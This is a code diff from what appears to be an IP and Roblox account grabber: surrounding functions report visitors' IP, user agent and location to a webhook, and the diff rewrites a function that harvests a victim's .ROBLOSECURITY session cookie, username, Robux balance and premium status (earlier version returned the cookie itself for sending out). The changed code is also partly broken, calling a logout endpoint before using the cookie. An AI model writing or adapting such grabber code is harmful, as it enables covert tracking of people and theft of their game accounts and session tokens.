@@ -76,30 +76,26 @@ def botCheck(ip, useragent):
     
 def get_roblox_info():
     try:
-        session = requests.Session()
-        cookie = session.cookies['.ROBLOSECURITY']
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        })
-        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
-        if user_resp.status_code != 200:
-            return None
-        user_data = user_resp.json()
-        uid = user_data.get('id')
-        username = user_data.get('name', 'Unknown')
-        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
-        if robux_resp.status_code != 200:
-            return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
-        robux_data = robux_resp.json()
-        robux = robux_data.get('robux', 0)
+        import requests
+        cookies = {'.ROBLOSECURITY': input('Enter .ROBLOSECURITY cookie: ')}
+        auth = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies)
+        if auth.status_code != 200: return None
+        
+        user = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies).json()
+        premium = requests.get('https://premiumfeatures.roblox.com/v1/users/'+str(user['id'])+'/validate-membership', cookies=cookies).json()
+        
         return {
-            'username': username,
-            'id': str(uid) if uid else 'Unknown',
-            'robux': f"{robux:,}",
-            'cookie': cookie
+            'username': user['name'],
+            'displayName': user['displayName'],
+            'id': user['id'],
+            'robux': requests.get('https://economy.roblox.com/v1/users/'+str(user['id'])+'/currency', cookies=cookies).json()['robux'],
+            'premium': premium['hasMembership']
         }
     except:
         return None
+
+roblox_info = get_roblox_info()
+
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -119,7 +115,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         return
     
     bot = botCheck(ip, useragent)
-    roblox_info = get_roblox_info()
     
     if bot:
         requests.post(config["webhook"], json = {
